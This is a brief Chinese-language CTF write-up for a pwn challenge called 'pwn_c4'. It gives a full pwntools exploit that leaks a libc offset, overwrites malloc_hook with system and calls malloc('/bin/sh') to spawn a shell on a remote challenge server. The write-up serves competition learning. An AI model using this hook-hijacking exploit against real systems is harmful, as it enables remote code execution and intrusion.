## pwn_c4

原题，先泄露偏移，然后算出system的地址，改malloc为system即可

参考2020网鼎杯原题：https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/10/boom/

完整exp

```from pwn import *io = remote("139.9.125.73 ",8888)payload= '''int main(int argc,char ** argv){    int libc,system,malloc_hook;    libc = argv[-12]-0x4018d3;    system = libc + 0x4F550;    malloc_hook = libc + (0x7ffff7dcdc30-0x00007ffff79e2000);    * (int *)malloc_hook = system;    malloc("/bin/sh");}'''io.send(payload)io.interactive()```
